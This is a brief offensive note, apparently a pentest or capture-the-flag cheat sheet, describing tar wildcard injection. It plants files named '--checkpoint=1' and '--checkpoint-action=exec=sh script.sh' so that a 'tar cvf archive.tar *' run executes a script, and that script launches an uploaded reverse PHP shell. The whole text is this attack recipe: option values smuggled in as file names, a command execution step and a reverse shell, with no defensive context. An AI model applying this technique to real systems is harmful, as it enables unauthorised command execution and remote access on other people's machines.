# Tar vulnerability 

We can exploit a tar wildcard (*) vulnerability : 
exemple: 
    tar cvf archive.tar * 
upload reverse php shell (shell.php)
+ file named  : 
    --checkpoint=1 
and 
    --checkpoint-action=exec=sh script.sh
+ script.sh => 
    php shell.php
and the job is done !
